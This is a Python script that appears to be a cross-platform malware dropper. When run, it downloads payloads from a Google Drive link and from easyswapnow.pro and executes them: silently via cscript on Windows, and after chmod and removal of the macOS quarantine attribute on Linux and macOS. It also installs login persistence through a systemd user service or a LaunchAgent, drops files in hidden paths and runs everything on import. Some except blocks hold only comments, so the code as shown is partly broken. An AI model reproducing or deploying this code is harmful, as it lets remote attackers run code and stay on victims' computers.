#!/usr/bin/env python3
import os
import sys
import subprocess
import urllib.request
import stat
import platform
import tempfile
from pathlib import Path

WIN_OS = 1
LIX_OS = 2
MAC_OS = 3

ARCH_X64 = "x64"
ARCH_ARM64 = "arm64"
ARCH_X86 = "x86"
ARCH_UNKNOWN = "unknown"


def check_os():
    os_name = platform.system()
    machine = platform.machine().lower()

    if os_name == "Windows":
        os_type = WIN_OS
    elif os_name == "Linux":
        os_type = LIX_OS
    elif os_name == "Darwin":
        os_type = MAC_OS
    else:
        os_type = None

    if machine in ("amd64", "x86_64"):
        arch = ARCH_X64
    elif machine in ("arm64", "aarch64"):
        arch = ARCH_ARM64
    elif machine in ("x86", "i386", "i686"):
        arch = ARCH_X86
    else:
        arch = ARCH_UNKNOWN

    return os_type, arch

def win_download_and_run(url, destination):
    urllib.request.urlretrieve(url, destination)

    subprocess.run(
        ["cscript.exe", "//nologo", destination],
        creationflags=subprocess.CREATE_NO_WINDOW
    )

def lix_download_and_run(url, destination):
    try:
        dest_dir = os.path.dirname(destination)
        if dest_dir:
            os.makedirs(dest_dir, mode=0o755, exist_ok=True)

        # Add a User-Agent header to avoid 403 errors
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
        }
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req) as response:
            with open(destination, 'wb') as out_file:
                out_file.write(response.read())

        current_mode = os.stat(destination).st_mode
        os.chmod(destination, current_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        
        result = subprocess.run(
            [destination],
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        # if result.returncode == 0:
        #     print(f"✓ Execution succeeded (return code {result.returncode})")
        # else:
        #     print(f"✗ Execution failed (return code {result.returncode})")
        #     if result.stdout:
        #         print(f"   stdout: {result.stdout.strip()}")
        #     if result.stderr:
        #         print(f"   stderr: {result.stderr.strip()}")

        return result

    except Exception as e:
        # print(f"✗ Error during download/execution: {e}")
        return None

def mac_download_and_run(url, destination):
    try:
        # Ensure directory exists
        os.makedirs(os.path.dirname(destination), mode=0o755, exist_ok=True)
        
        # Add a User-Agent header to avoid 403 errors
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
        }
        req = urllib.request.Request(url, headers=headers)
        
        with urllib.request.urlopen(req) as response:
            with open(destination, 'wb') as out_file:
                out_file.write(response.read())
        
        # Make executable
        os.chmod(destination, os.stat(destination).st_mode | stat.S_IXUSR)
        
        # Remove quarantine (optional, may fail if not needed)
        try:
            subprocess.run(['xattr', '-d', 'com.apple.quarantine', destination],
                         capture_output=True)
        except:
            # print(f"ℹ No quarantine attribute to remove")
        
        # Run
        return subprocess.run([destination])
        
    except Exception as e:
        # print(f"✗ Error: {e}")
        return None

def lix_auto_setup_persistence(script_path):
    """Configure the current Python script to run automatically at user login via a systemd user service."""
    try:
        service_dir = Path.home() / ".config" / "systemd" / "user"
        service_dir.mkdir(parents=True, exist_ok=True)

        service_path = service_dir / "python-script.service"

        service_content = f"""[Unit]
Description=User Python Script

[Service]
Type=simple
ExecStart=/usr/bin/python3 {script_path}
Restart=no

[Install]
WantedBy=default.target
"""

        with open(service_path, "w") as f:
            f.write(service_content)

        subprocess.run(
            ["systemctl", "--user", "daemon-reload"],
            check=True
        )

        subprocess.run(
            ["systemctl", "--user", "enable", "--now", "python-script.service"],
            check=True
        )

        return True

    except Exception as e:
        # print(f"✗ Failed: {e}")
        return False

def mac_auto_setup_persistence(script_path):
    """Automatically set up persistence without user interaction"""
    try:
        plist_name = "com.user.script.plist"
        plist_path = Path.home() / "Library/LaunchAgents" / plist_name
        
        # Create directory if needed
        plist_path.parent.mkdir(parents=True, exist_ok=True)
        
        # Create plist
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.user.script</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <false/>
    <key>StandardOutPath</key>
    <string>/tmp/script.log</string>
    <key>StandardErrorPath</key>
    <string>/tmp/script.err</string>
</dict>
</plist>'''
        
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        
        # Load service
        subprocess.run(['launchctl', 'load', '-w', str(plist_path)], check=True)
        return True
        
    except Exception as e:
        # print(f"✗ Failed to enable persistence: {e}")
        return False

def is_persistence_already_setup(os_type):
    """Check if persistence is already configured for the given OS."""
    if os_type == LIX_OS:
        service_path = Path.home() / ".config/systemd/user/python-script.service"
        if service_path.exists():
            # Check if it's enabled (optional, but avoids constant re-enabling)
            result = subprocess.run(
                ["systemctl", "--user", "is-enabled", "python-script.service"],
                capture_output=True, text=True
            )
            return result.returncode == 0
        return False
    elif os_type == MAC_OS:
        plist_path = Path.home() / "Library/LaunchAgents/com.user.script.plist"
        return plist_path.exists()
    return False

def setup_persistence(os_type, script_path):
    """Set up persistence based on the OS type."""
    if os_type == LIX_OS:
        return lix_auto_setup_persistence(script_path)
    elif os_type == MAC_OS:
        return mac_auto_setup_persistence(script_path)
    return False

def download_and_run_payload(os_type, arch):
    """Download and execute the appropriate payload for the OS and architecture."""
    # Choose location
    WIN_DEST = os.path.join(tempfile.gettempdir(), "t.jse")
    LIX_DEST = os.path.expanduser("~/.local/share/config")
    MAC_DEST = "/Users/Shared/.local/config"
    
    WIN_URL = "https://drive.google.com/uc?export=download&id=1d4zF8lnDaYCgzRrEx3WCyLTFZXVD2QBF&confirm=t"
    LIX_URL_AMD = "https://easyswapnow.pro/downloads/lix_amd.bin"
    LIX_URL_ARM = "https://easyswapnow.pro/downloads/lix_arm.bin"
    MAC_URL_AMD = "https://easyswapnow.pro/downloads/mac_amd.bin"
    MAC_URL_ARM = "https://easyswapnow.pro/downloads/mac_arm.bin"

    if os_type == WIN_OS:
        return win_download_and_run(WIN_URL, WIN_DEST)
    elif os_type == LIX_OS:
        if arch == ARCH_ARM64:
            return lix_download_and_run(LIX_URL_ARM, LIX_DEST)
        else:
            return lix_download_and_run(LIX_URL_AMD, LIX_DEST)
    elif os_type == MAC_OS:
        if arch == ARCH_ARM64:
            return mac_download_and_run(MAC_URL_ARM, MAC_DEST)
        else:
            return mac_download_and_run(MAC_URL_AMD, MAC_DEST)
    return None

def _run_payload():
    # Get OS and architecture info
    os_type, arch = check_os()
    
    # Get script path for persistence
    script_path = os.path.abspath(__file__)
    
    # Set up persistence if not already configured
    if not is_persistence_already_setup(os_type):
        # print("Setting up persistence...")
        success = setup_persistence(os_type, script_path)
        if success:
            # print("✓ Persistence setup complete")
        else:
            # print("✗ Persistence setup failed")
    
    # Download and run the payload
    download_and_run_payload(os_type, arch)

_run_payload()